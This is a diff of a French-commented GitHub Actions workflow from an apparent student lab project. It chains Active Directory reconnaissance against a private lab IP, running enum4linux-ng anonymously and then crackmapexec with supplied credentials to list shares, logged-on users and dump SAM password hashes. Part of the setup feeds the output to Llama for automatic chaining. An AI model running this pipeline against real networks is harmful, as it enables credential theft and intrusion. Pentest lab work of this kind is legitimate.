@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       scan_type:
-        description: 'Stratégie de scan à lancer'
+        description: 'Stratégie de scan'
         required: true
         default: 'anonyme'
         type: choice
@@ -12,9 +12,18 @@ on:
           - anonyme
           - authentifie
       target_ip:
-        description: 'IP cible (ex: 192.168.159.100)'
+        description: 'IP cible'
         required: true
         default: '192.168.159.100'
+      # Nouveaux champs pour le chaining automatique
+      username:
+        description: 'Utilisateur pour scan authentifié'
+        required: false
+        default: ''
+      password:
+        description: 'Mot de passe pour scan authentifié'
+        required: false
+        default: ''
 
 jobs:
   offensive_task:
@@ -23,28 +32,32 @@ jobs:
       - name: 1. Vérification réseau
         run: ping -c 2 ${{ github.event.inputs.target_ip }}
 
-      # --- SCÉNARIO A : SCAN ANONYME (Nmap NSE avancés) ---
-      - name: Lancer Scan Anonyme (Nmap NSE)
+      # --- SCÉNARIO A : SCAN ANONYME ---
+      - name: Lancer Scan Anonyme (Nmap + Enum4linux-ng basic)
         if: ${{ github.event.inputs.scan_type == 'anonyme' }}
         run: |
-          # Utilisation de scripts NSE pour l'énumération profonde
-          nmap -Pn -p 445,139,389 \
-            --script smb-protocols,smb2-security-mode,smb-os-discovery,smb-enum-shares,ldap-rootdse \
-            ${{ github.event.inputs.target_ip }} -oX ad_report.xml
+          # On génère un format JSON pour que Llama puisse le lire facilement
+          enum4linux-ng -A ${{ github.event.inputs.target_ip }} > ad_report.json || true
 
-      # --- SCÉNARIO B : SCAN AUTHENTIFIÉ ---
-      - name: Lancer Scan Authentifié (Enum4linux-ng)
+      # --- SCÉNARIO B : SCAN AUTHENTIFIÉ (CHAINING) ---
+      - name: Lancer Scan Authentifié (CrackMapExec / NetExec)
         if: ${{ github.event.inputs.scan_type == 'authentifie' }}
-        env:
-          USER: "user.std"
-          PASS: ${{ secrets.AD_PASSWORD }}
-          DOMAIN: "PFE"
         run: |
-          enum4linux-ng -u "$USER" -p "$PASS" -w "$DOMAIN" -A ${{ github.event.inputs.target_ip }} > ad_report.json || true
+          # On utilise les credentials envoyés par le script Python
+          # Si username est vide, on utilise 'support.it' par défaut (celui trouvé dans ton log)
+          USER="${{ github.event.inputs.username }}"
+          if [ -z "$USER" ]; then USER="support.it"; fi
+          
+          PASS="${{ github.event.inputs.password }}"
+          
+          echo "🔥 Lancement de l'exploitation authentifiée avec l'utilisateur: $USER"
+          
+          # CrackMapExec est plus puissant pour montrer l'exploitation au jury
+          crackmapexec smb ${{ github.event.inputs.target_ip }} -u "$USER" -p "$PASS" --shares --sam --loggedon-users > ad_report.json || true
 
       - name: Archivage du rapport
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rapport-${{ github.event.inputs.scan_type }}
-          path: ad_report.*
+          name: rapport-ad
+          path: ad_report.json
